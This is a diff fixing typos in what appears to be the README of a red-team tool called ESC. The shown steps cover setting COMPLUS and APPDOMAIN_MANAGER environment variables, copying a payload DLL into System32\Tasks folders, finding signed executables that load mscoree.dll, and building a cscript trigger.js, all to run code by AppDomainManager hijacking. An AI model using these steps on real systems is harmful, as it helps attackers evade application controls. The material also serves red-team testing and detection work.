@@ -119,13 +119,13 @@ set APPDOMAIN_MANAGER_TYPE=Esc
 set COMPLUS_Version=v4.0.30319
 </pre>
 
-3. Copy tasks.dll to target directory.
+3. Copy tasks.dll to target directories.
 <pre>
 copy tasks.dll C:\Windows\System32\Tasks\tasks.dll 
 copy tasks.dll C:\Windows\SysWow64\Tasks\tasks.dll
 </pre>
 
-4. Identify .exe in c:\windows\system32\ that load mscoreee.dll.  This can be done quickly using the Get-PE from Matt Graeber's [PowerShell Arsenal Project](https://github.com/mattifestation/PowerShellArsenal).
+4. Identify .exe in c:\windows\system32\ that load mscoreee.dll.  This can be done quickly using the Get-PE function from Matt Graeber's [PowerShell Arsenal Project](https://github.com/mattifestation/PowerShellArsenal).
 <pre>
 gci c:\windows\system32\*.exe | get-pe | where-object {$_.Imports.ModuleName -Contains "mscoree.dll"} | Select ModuleName -ExpandProperty modulename
 </pre>
@@ -161,7 +161,7 @@ C:\windows\system32\Vmw.exe
 
 Using the steps below ESC can also be executed using cscript.exe once the tasks.dll has been written to disk.  Once again, based on Casey Smith's templates.
 
-1. Create the file trigger.js wiht the content below.
+1. Create the file trigger.js with the content below.
 <pre>
 new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';new ActiveXObject('WScript.Shell').Environment('Process')('TMP') = 'c:\\Windows\\System32\\Tasks';
 new ActiveXObject('WScript.Shell').Environment('Process')('APPDOMAIN_MANAGER_ASM') = 'tasks, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null';
